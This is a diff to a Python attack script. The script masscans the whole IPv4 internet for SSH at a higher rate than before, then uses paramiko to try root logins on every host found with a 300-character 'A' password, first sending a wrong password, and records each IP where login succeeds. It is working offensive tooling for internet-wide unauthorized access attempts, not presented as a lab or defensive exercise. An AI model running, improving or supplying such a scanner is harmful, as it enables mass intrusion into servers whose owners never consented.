@@ -2,6 +2,7 @@
 import subprocess
 import paramiko
 import re
+import socket
 from concurrent.futures import ThreadPoolExecutor
 
 PASSWORD = "A" * 300
@@ -11,27 +12,28 @@ MAX_WORKERS = 200
 IP_PATTERN = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
 
 def masscan():
-    cmd = ["masscan", "0.0.0.0/0", "-p22", "--rate=100000", "--wait=130", "--exclude", "255.255.255.255", "-oL", SCAN_FILE]
+    cmd = ["masscan", "0.0.0.0/0", "-p22", "--rate=300000", "--wait=130", "--exclude", "255.255.255.255", "-oL", SCAN_FILE]
     subprocess.run(cmd, check=True)
 
 def try_login(ip):
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        client.connect(ip,
-                       port=22,
-                       username="root",
-                       password=PASSWORD,
-                       timeout=10,
-                       allow_agent=False,
-                       look_for_keys=False)
-        with open(RESULTS_FILE, "a") as f:
-            f.write(ip + "\n")
-        print(f"[+] {ip} root login OK")
+        t = paramiko.Transport(socket.create_connection((ip, 22)))
+        t.start_client(timeout=10)
+        
+        for pw in ("wrong", PASSWORD):
+            try:
+                t.auth_password("root", pw)
+                if len(pw) == 300:
+                    with open(RESULTS_FILE, "a") as f:
+                        f.write(ip + "\n")
+                    print(f"[+] {ip} root login OK")
+                break
+            except paramiko.AuthenticationException:
+                pass
+                
+        t.close()
     except Exception:
         pass
-    finally:
-        client.close()
 
 def main():
     masscan()
